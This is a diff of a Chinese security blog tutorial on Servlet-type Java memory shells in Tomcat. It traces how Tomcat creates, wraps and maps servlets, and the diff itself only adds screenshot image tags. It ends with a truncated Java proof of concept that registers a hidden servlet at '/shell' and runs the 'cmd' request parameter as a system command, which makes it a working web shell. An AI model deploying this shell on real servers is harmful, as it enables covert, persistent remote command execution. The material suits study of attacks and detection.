@@ -298,7 +298,7 @@
 </ul>
 <h2 id="0x02-Servlet-创建"><a href="#0x02-Servlet-创建" class="headerlink" title="0x02 Servlet 创建"></a>0x02 Servlet 创建</h2><p>早在我最前面的一篇，关于 Java 内存马的基础文章里面提到过 Servlet，在我眼里它是半个中间件。流程是 <code>init()</code> —-&gt; <code>doXXX</code> —-&gt; <code>destory()</code></p>
 <p>这里我们可以先看一下 Servlet 这个接口有哪些方法</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ServletInterface.png" class>
 
 <p>Servlet 接口分别有如下几个方法：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。  </span></span><br><span class="line">  </span><br><span class="line">   ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  </span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  </span></span><br><span class="line">  </span><br><span class="line">   String <span class="title function_">getServletInfo</span><span class="params">()</span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.  </span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -308,7 +308,7 @@
 
 <p>并且配置 web.xml，这里最好配一下，如果不配后续的分析会比较难。</p>
 <p>测试一下，成功！</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ServletTest.png" class>
 
 <h2 id="0x03-Servlet-流程分析"><a href="#0x03-Servlet-流程分析" class="headerlink" title="0x03 Servlet 流程分析"></a>0x03 Servlet 流程分析</h2><blockquote>
 <p>前情剧透：Servlet 的流程分析比 Filter 和 Listener 复杂一些</p>
@@ -317,58 +317,58 @@
 <ul>
 <li>如图，这里我先把断点下在了 <code>service()</code> 方法，我们可以看到这个地方是有 Filter 的流程的。</li>
 </ul>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ContainsFilter.png" class>
 
 <blockquote>
 <p>正式开始分析，我们把断点下在 <code>init()</code> 方法这里。</p>
 </blockquote>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/StartDebug.png" class>
 
 <h3 id="获取到-HTTP-请求"><a href="#获取到-HTTP-请求" class="headerlink" title="获取到 HTTP 请求"></a>获取到 HTTP 请求</h3><p>这里我们肯定还要回去，从前面开始分析。也就是把断点下到 <code>HTTP11Processor</code> 类的 <code>service()</code> 方法，重新开始调试。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/HTTP11Processor.png" class>
 
 <p>这个 <code>HTTP11Processor</code> 类是一个网络请求的类，它的作用是处理数据包，而它的 <code>service()</code> 方法主要是在处理 HTTP 包的请求头，主要做了赋值的工作，后续会通过 <code>ByteBuff</code> 进行数据解析。</p>
 <p>所以这一块并不是很重要，都是一些基础的赋值，我们继续往下走，直接到 343 行这里</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.getAdapter().service(<span class="built_in">this</span>.request, <span class="built_in">this</span>.response);</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/343Service.png" class>
 
 <p>跟进，我们去到的是 <code>CototeAdapter</code> 类的 <code>service()</code> 方法里， CoyoteAdapter 是 Processor 和 Valve 之间的适配器。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapter.png" class>
 
 <p>首先我们关注传参，传入的参数是 <code>org.apache.coyote.Request</code> 和 <code>org.apache.coyote.Response</code> 类型的对象，后面又进行了 <code>getNote()</code> 方法的调用。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/reqAndres.png" class>
 
 <ul>
 <li>对应的 <code>getNote()</code> 方法</li>
 </ul>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getNote.png" class>
 
 <p>这两个 <code>getNote()</code> 方法都是取 notes 数组里指定 pos 的对象，也就是去 <code>notes[1]</code> 的这个对象，<code>note[1]</code> 的的值是在 <code>CoyoteAdapter#service</code> 里设值的。</p>
 <p>我们继续往下看，如果 <code>request == null</code>，进行一系列的赋值。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/requestValue.png" class>
 
 <p>后续也都是一些基础的赋值啥的，直到 353 行这里</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure>
 
 <p>这一行是 <code>service()</code> 方法里最关键的步骤了</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapterService.png" class>
 
 <p>比较复杂，我们要逐个分析，首先是变量名 connector，它里面存了我们一整个的 HTTP 包。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/connector.png" class>
 
 <p>这里师傅们可以逐个点进去看一下</p>
 <p><code>connector.getService()</code> 返回的是 Connector 关联的 Service 属性，也就是 <code>StandardService</code> 类型的对象。  </p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getService.png" class>
 
 <p><code>connector.getService().getContainer()</code> 返回的是 Service 里的容器 Engine 属性，也就是 <code>StandardEngine</code> 对象。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getContainer.png" class>
 
 <p><code>connector.getService().getContainer().getPipeline()</code> 返回的是 StandardEngine 里的 Pipeline 属性，也就是 <code>StandardPipeline</code> 对象。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getPipeline.png" class>
 
 <p>返回的是 <code>StandardPipeline</code> 的 Valve 类型的数行 first 或者 basic</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getFirst.png" class>
 
 <p>这里感觉获取不到什么有用的信息，所以直接跳进 <code>invoke()</code> 方法， <code>StandardEngineValve#inovke()</code> 进行了 host 相关的简单判断。再继续往下，host 是 Tomcat 内置的 host。</p>
 <p>后续的内容就和 Filter 很类似，也就是多个 invoke 的调用，综上，这其实是一个获取到 HTTP 请求，进行预处理的过程。</p>
@@ -376,75 +376,75 @@
 <ul>
 <li>断点位置如图</li>
 </ul>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/webxmlDebugPoint.png" class>
 
 <p>开始调试，首先我们获取到了此项目里面的 web.xml 文件</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getWebXml.png" class>
 
 <p>中间内容是处理 Filter，Listener 等信息的代码，所以这里我们直接跳过，到 1115 行的 <code>configureContext(webXml);</code> 中去</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/into.png" class>
 
 <p>跟进，我们看到 <code>configureContext()</code> 方法也是先获取 Listener，Filter，还有 localeEncodingMappings 等，继续往下走，直到 1281 行这里，开始进行 Servlet 的读取。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fourServlets.png" class>
 
 <h3 id="创建与装载-StandardWrapper"><a href="#创建与装载-StandardWrapper" class="headerlink" title="创建与装载 StandardWrapper"></a>创建与装载 StandardWrapper</h3><p>1282 行的语句，createWrapper()，实际上就是创建了 StandardWrpper，后续代码会对它进行加载与处理。</p>
 <p>继续往下走，这里很明显，我们将所有的 servlets 保存到了 Wrapper 里面，如图。后面代码做的很大一部分工作都是在把 web.xml 里面的数据写到 StandardWrapper 里面</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getServletName.png" class>
 
 <p>我们继续往下看，后续都是一些添加的操作了，这里我们先跳过了。继续往下看，1334 行，将 Wrapper 添加到 context 中，这里对应的是 StandardContext。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChild.png" class>
 
 <p>后续把 web.xml 中的内容装载进了 StandardWrapper 中。也就是 StandardWrapper 的装载</p>
 <ul>
 <li>那么这里我们就应该思考了，Wrapper 里面包含了我们的恶意 Servlet 内存马，那 Wrapper 最后是放到哪里去的呢？</li>
 </ul>
 <p>其实是 <code>addChild()</code> 方法把 Wrapper（这个 Wrapper 后面我们会看到是 StandardWrapper） 放进 StandardContext 里面去了，之后又做了一系列的处理，当时看了很多文章，都交代的很不清楚，我这边带师傅们过一遍。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/EvilServletGet.png" class>
 
 <p>紧接上文，我们跟进 <code>addChild()</code> 方法，这时候去到的是 <code>StandardContext</code> 类的 <code>addChild()</code> 方法，它判断这个 Servlet 是否是 JSP 的 Servlet</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildJSP.png" class>
 
 <p>运行到最后，是这个语句，这里如果环境有问题的师傅可以私聊一下我，我当时也是搭的环境有问题，导致一直在踩坑。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">super</span>.addChild(child);</span><br></pre></td></tr></table></figure>
 
 <p>跟进去，发现是它的父类，ContainerBase，这是一个抽象类，当时我一度以为我分析错了，结果发现并不是错误。</p>
 <p><code>ContainerBase</code> 类的 <code>addChild()</code> 方法判断了是否开启全局安全这个配置。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ContainerBaseAddChild.png" class>
 
 <p>继续往下，跟进到 <code>addChildInternal()</code> 方法里面</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildInternal.png" class>
 
 <p>它首先判断了 log，也就是日志功能是否开启，这些都是无足轻重的，主要是它在 753 行这里调用了这个语句</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">child.start();</span><br></pre></td></tr></table></figure>
 
 <p>start 方法，就是启动一个线程，在我们 Servlet 里面，也就是开启此 Servlet 的线程，我们跟进去看 Servlet 的线程被启动之后做了什么事。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBase.png" class>
 
 <p>这里我们从 <code>ContainerBase</code> 类进入到了 <code>LifecycleBase</code> 类，</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBaseInit.png" class>
 
 <p><code>LifecycleBase</code> 类的 <code>start()</code> 方法这里先是进行了一些基础的日志判断，后面肯定是会走到 <code>init()</code> 方法里面进去的，要不然刚开始 start 的一个 Servlet 直接就 stop，是不合理的。</p>
 <p><code>init()</code> 里面就是一些基础的赋值，我们这里就不看了，主要看后面的重点部分 ———— <code>startInternal()</code></p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/startInternal.png" class>
 
 <p>跟进去，这里我们就走到了 <code>StandardContext#startInternal</code>，如图</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/StandardWrapperstartInternal.png" class>
 
 <p>往下走，到 5130 行，调用了 <code>fireLifecycleEvent()</code>，它主要做了一个解析 web.xml 的工作。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent.png" class>
 
 <p>f8 往下走，就会走到 <code>ContextConfig#configureContext</code> 方法这里</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContext.png" class>
 
 <p>这里回来，又把 web.xml 的东西装了一遍，过程有点套娃，但是也可以理解。</p>
 <ul>
 <li>总而言之，<code>addChild()</code> 方法把 servlet 放进了 children 里面，children 也就是 StandardWrapper，如图。</li>
 </ul>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildDown.png" class>
 
 <p>在 <code>addChild()</code> 方法之后，调用 <code>addServletMappingDecoded()</code> 方法添加映射关系。</p>
 <p>将 url 路径和 servlet 类做映射。</p>
-  
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addServletMappingDecoded.png" class>  
 <p>总结一下，Servlet 的生成与动态添加依次进行了以下步骤</p>
 <ul>
 <li>通过 <code>context.createWapper()</code> 创建 Wapper 对象；</li>
@@ -458,17 +458,17 @@
 <li>上文我们的分析点是停在了 <code>addChild()</code>，以及 <code>addChild()</code> 之后的 <code>addServletMappingDecoded()</code> 映射。</li>
 <li>这其实是因为我们当时在 <code>StandardContext#startInternal</code> 中，进了 <code>fireLifecycleEvent()</code> 方法，又做了一遍 StandardWrapper 装载的工作。</li>
 </ul>
-  
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent2.png" class>  
 
 <p>所以这里我们重新回到 <code>StandardContext#startInternal</code> 中，从 <code>fireLifecycleEvent()</code> 方法往下走。</p>
 <p>继续往下走，无非是一些赋值，都不怎么重要，重要的地方在这里：</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUp.png" class>
 
 <p>跟进，进入到 <code>loadOnStartup()</code> 方法</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUpCode.png" class>
 
 <p>我们会看到它对 <code>loadOnStartUp</code> 这个属性进行了判断</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JudgeloadOnStartUp.png" class>
 
 <p>对于这个参数：</p>
 <p>在 servlet 的配置当中，<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code> 的含义是： 标记容器是否在启动的时候就加载这个 servlet。 当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet； 当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。 正数的值越小，启动该 servlet 的优先级越高。</p>
@@ -499,7 +499,7 @@
 <li>恶意 Servlet</li>
 </ul>
 <p>这里我直接以流程图来演示吧，更为清晰一些。</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AttackRoute.png" class>
 
 <ol>
 <li>获取 <code>StandardContext</code> 对象</li>
@@ -529,17 +529,17 @@
 <p>Servlet 型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的 url 才能触发</p>
 <p>Servlet 型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p>
 <p>先访问 Servlet.jsp，完成内存马的注册</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/RegisterForJSP.png" class>
 
 <p>再访问 servletshell；并带上 <code>cmd</code> 参数</p>
-
+<img src="/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SuccessJSP.png" class>
 
 <h3 id="编写-Servlet-内存马的-PoC（-java）"><a href="#编写-Servlet-内存马的-PoC（-java）" class="headerlink" title="编写 Servlet 内存马的 PoC（.java）"></a>编写 Servlet 内存马的 PoC（.java）</h3><p>思想是类似的，师傅们可以自行复现；这里是需要在 web.xml 里面加上 servlet 的调用的。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tomcatShell.Servlet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletShell</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            reqF = servletRequest.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        reqF.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            req = (Request) reqF.get(servletRequest);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();  </span><br><span class="line">  </span><br><span class="line"> <span class="type">ServletShell</span> <span class="variable">servletShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletShell</span>();  </span><br><span class="line"> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servletShell.getClass().getSimpleName();  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();  </span><br><span class="line"> wrapper.setLoadOnStartup(<span class="number">1</span>);  </span><br><span class="line"> wrapper.setName(name);  </span><br><span class="line"> wrapper.setServlet(servletShell);  </span><br><span class="line"> wrapper.setServletClass(servletShell.getClass().getName());  </span><br><span class="line"> standardContext.addChild(wrapper);  </span><br><span class="line"> standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);  </span><br><span class="line">  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line"> <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="keyword">try</span>&#123;  </span><br><span class="line">                Runtime.getRuntime().exec(cmd);  </span><br><span class="line"> &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line"> &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;  </span><br><span class="line">                n.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HttpServletResponse <span class="title function_">getResponseFromRequest</span><span class="params">(HttpServletRequest var1)</span> &#123;  </span><br><span class="line">        <span class="type">HttpServletResponse</span> <span 